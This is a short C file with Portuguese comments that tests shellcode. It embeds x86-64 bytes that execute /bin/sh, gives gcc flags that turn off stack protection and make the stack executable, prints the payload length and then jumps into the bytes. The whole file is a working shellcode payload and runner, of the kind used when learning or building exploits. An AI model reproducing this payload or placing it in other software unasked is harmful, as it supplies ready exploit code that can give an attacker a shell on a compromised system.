// shellcode para testar e pegar o tamanho do mesmo
//compilado em gcc linux
//comando:
// gcc -fno-stack-protector -z execstack testando.c -o testando
//para abrir:
// ./testando
//-----------------------------------------------------------------
//observação:
//o shellcode do exemplo abaixo devolve um shell quando executado no linux


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43";


int main()
{

	printf("Shellcode tamanho:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}